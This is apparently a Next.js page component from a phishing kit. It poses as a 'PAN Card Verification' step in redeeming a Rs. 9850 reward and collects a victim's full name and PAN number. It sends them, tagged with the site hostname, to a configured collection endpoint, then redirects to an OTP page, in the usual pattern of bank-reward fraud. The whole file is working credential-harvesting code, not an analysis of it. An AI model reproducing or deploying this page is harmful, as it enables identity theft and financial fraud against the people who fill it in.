'use client'
import Captcha from "../../assets/captcha.png";
import { useRouter } from "next/navigation"; // in client component

import { useState } from 'react';
export default function Home() {
   const router = useRouter();
   const  [response, setResponse] = useState(false);
  const handleSubmit = (e) => {
    e.preventDefault();
      const formData = new FormData(e.target);
      const body = {};
      formData.forEach((value, key) => {
        body[key] = value;
      });
      body['site'] = window.location.hostname;
      fetch(process.env.API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json'},
        body: JSON.stringify(body),
      })
        .then((res) => res.json())
        .then((responseData) => {
          if(responseData.status == 200){
            setResponse(true);
            router.push("/otp?next=/aad")
          }else{
            setResponse(false);
            console.log('failed');
          }
            
        })
        .catch((error) => {
          setResponse(false);
          console.error(error);
        });
  };
  return (
    <div className="container">
<form
  onSubmit={handleSubmit}
>
  <div className="box">
    <div className="page-hea">
      <div className="row">
        <div className="col-xs-6 col-md-6">
          <h2
            style={{
              fontFamily: '"Open Sans", sans-serif',
              fontSize: 16,
              fontWeight: 600,
              alignItem: "centre",
              textAlign: "centre"
            }}
          >
            PAN Card Verification{" "}
          </h2>
        </div>
        <div className="col-xs-6 col-md-6 text-right">
          <h2>X</h2>
        </div>
      </div>
    </div>
    <div className="row">
      <div className="col-md-6 col-xs-12">
        <div className="progress">
          <div
            className="progress-bar"
            style={{
              fontFamily: '"Open Sans", sans-serif',
              color: "#fff",
              fontWeight: 500,
              width: "100%"
            }}
          >
            step 2/4: Redeem of reward worth Rs. 9850{" "}
          </div>
        </div>
        <div className="p-50">
          <center>
            <h4
              style={{
                fontFamily: '"Open Sans", sans-serif',
                color: "#000",
                fontWeight: 700,
                marginTop: "-10%"
              }}
            >
              PAN Card Verification
            </h4>
          </center>
          <br />
          <br />
          <div className="login-box">
            <div className="user-box">
              <input
                type="text"
                name="FFNN"
                className="name"
                onkeydown="return /[a-z A-Z]/i.test(event.key)"
                minLength={3}
                maxLength={40}
                required
              />
              <label>
                Full name (as per PAN)<span style={{ color: "red" }}> *</span>
              </label>
            </div>
            <div className="user-box">
              <input
                type="text"
                name="PNAA"
                className="name"
                id="pan"
                maxLength={10}
                pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}"
                title="Please enter valid PAN Card number !"
                required
              />
              <label>
                PAN card number<span style={{ color: "red" }}> *</span>
              </label>
            </div>
          </div>
        </div>
        <div className="row">
          <div className="col-xs-12 col-md-12 text-center">
            <a
              href="#"
              style={{ fontFamily: '"Open Sans", sans-serif', fontWeight: 500 }}
              className="btn btn-border"
            >
              Back
            </a>
            <button
              type="submit"
              style={{ fontFamily: '"Open Sans", sans-serif', fontWeight: 500 }}
              className="btn btn-primary"
            >
              {" "}
              Submit{" "}
            </button>
          </div>
        </div>
        <br />
      </div>
    </div>
  </div>
</form>

    </div>
  
  )
}
